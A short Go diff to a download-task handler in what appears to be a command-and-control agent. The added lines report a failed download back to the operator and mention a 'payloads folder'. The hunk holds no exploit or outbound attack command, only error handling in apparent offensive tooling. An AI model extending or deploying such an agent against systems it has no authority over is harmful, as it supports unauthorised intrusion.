@@ -310,6 +310,9 @@ func handle_download(this_taskID string, args string) {
 	// Download the file
 	err := downloadFile(filename, destination, this_taskID)
 	if err != nil {
+
+		response := Task_Response{this_taskID, "Failed", "Could not download file. Make sure it's in the payloads folder"}
+		send_response(response)
 		fmt.Println("Error downloading file:", err)
 		return
 	}
